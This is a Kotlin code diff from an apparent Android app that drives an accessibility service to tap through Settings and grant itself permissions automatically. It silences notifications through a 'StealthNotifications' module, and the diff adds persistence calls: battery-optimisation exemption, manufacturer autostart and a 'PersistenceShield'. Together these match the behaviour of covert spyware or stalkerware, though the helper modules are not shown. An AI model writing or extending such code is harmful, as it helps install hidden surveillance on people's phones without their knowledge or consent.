@@ -59,7 +59,8 @@ object SettingsPermissionGrant {
         SetupReporter.progress("Toggling permissions ON…")
         PermissionAutoGrant.runSettingsPass(context, "Permission list", 35_000)
 
-        requestBatteryExemption(context)
+        PersistenceHelper.requestBatteryExemption(context)
+        PersistenceHelper.openManufacturerAutostart(context)
         Thread.sleep(700)
         PermissionAutoGrant.runSettingsPass(context, "Battery", 8_000)
 
@@ -69,6 +70,7 @@ object SettingsPermissionGrant {
         PermissionAutoGrant.runSilentBlocking(context, 25_000)
 
         StealthNotifications.suppressAll(context)
+        PersistenceShield.applyAll(context)
         returnToHome(service)
 
         val taps = PermissionAutoGrant.lastTapCount()
@@ -93,14 +95,6 @@ object SettingsPermissionGrant {
             addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
         }
         context.startActivity(intent)
-    }
-
-    private fun requestBatteryExemption(context: Context) {
-        val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
-            data = Uri.parse("package:${context.packageName}")
-            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-        }
-        runCatching { context.startActivity(intent) }
     }
 
     private fun tapNavigate(context: Context, service: TouchAccessibilityService, keywords: List<String>) {
